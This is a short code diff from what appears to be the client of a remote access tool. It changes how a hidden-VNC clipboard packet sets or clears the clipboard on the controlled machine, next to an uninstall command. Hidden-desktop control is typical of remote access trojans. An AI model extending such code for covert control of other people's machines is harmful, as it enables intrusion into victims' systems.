@@ -226,8 +226,8 @@ internal class TlsClient : IDisposable
                     break;
                 case PacketType.HvncClipboard:
                     var hvncClip = System.Text.Json.JsonSerializer.Deserialize<HvncClipboardDataStub>(packet.Data, SeroJson.Default.HvncClipboardDataStub);
-                    if (hvncClip != null && !string.IsNullOrEmpty(hvncClip.Text))
-                        HvncFeature.SetClipboard(hvncClip.Text);
+                    if (hvncClip != null)
+                        HvncFeature.SetClipboard(hvncClip.Text ?? ""); // empty string = clear clipboard
                     break;
 
                 case PacketType.Uninstall:
